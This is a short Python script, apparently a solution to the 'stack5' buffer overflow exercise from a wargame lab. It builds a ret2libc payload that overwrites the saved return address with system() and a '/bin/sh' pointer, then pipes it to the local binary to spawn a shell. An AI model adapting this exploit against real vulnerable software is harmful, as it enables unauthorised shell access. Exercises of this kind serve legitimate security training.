import subprocess
import struct


bin_sh = 0xf7f84a8c
system = 0xf7e66e70

# First, the buffer overflow.
payload =  "A"*99
#overwrite saved ebp
payload += "BBBB"
#then overwrite return with system call
payload += struct.pack('I',system)
#fake return
payload+="CCCC"
#binsh arg for system
payload+= struct.pack('I',bin_sh)



print (payload)

p = subprocess.Popen("./stack5", stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
p.communicate(payload)
